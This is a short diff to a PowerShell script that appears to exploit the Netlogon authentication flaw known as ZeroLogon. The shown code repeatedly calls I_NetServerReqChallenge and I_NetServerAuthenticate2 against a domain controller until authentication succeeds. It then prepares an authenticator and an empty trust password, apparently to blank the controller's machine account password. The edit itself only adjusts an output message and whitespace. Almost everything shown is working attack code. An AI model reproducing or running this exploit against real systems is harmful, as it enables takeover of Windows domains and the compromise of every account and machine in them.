@@ -155,6 +155,7 @@ Param(
     $ServerChallenge = New-Object ZeroLogon.Netapi32+NETLOGON_CREDENTIAL
     [Uint64]$Flags = [Uint64]0x212fffff 
 
+    
     for( $i = 0; $i -lt 2000; $i ++){
         if([ZeroLogon.Netapi32]::I_NetServerReqChallenge($fqdn, $hostname, [Ref] $ClientChallenge, [Ref] $ServerChallenge) -ne 0){
              Write-Host "Can't complete server challenge. check FQDN" 
@@ -162,7 +163,8 @@ Param(
              }
         write-host "=" -NoNewline
         if([ZeroLogon.Netapi32]::I_NetServerAuthenticate2($fqdn, $hostname+"$",[ZeroLogon.Netapi32+NETLOGON_SECURE_CHANNEL_TYPE]::ServerSecureChannel.value__, $hostname, [Ref] $ClientChallenge, [ref] $ServerChallenge, [ref] $Flags) -eq 0){
-            Write-Host "`nServer is vulnerable";
+            Write-Host "`nServer $fqdn is vulnerable";
+            $fqdn
             
             $authenticator = New-Object ZeroLogon.Netapi32+NETLOGON_AUTHENTICATOR;
             $EmptyPassword = New-Object ZeroLogon.Netapi32+NL_TRUST_PASSWORD;
@@ -180,6 +182,8 @@ Param(
         }
     }
     Write-Host "Host appears to be patched";
+
+
 
 
 }
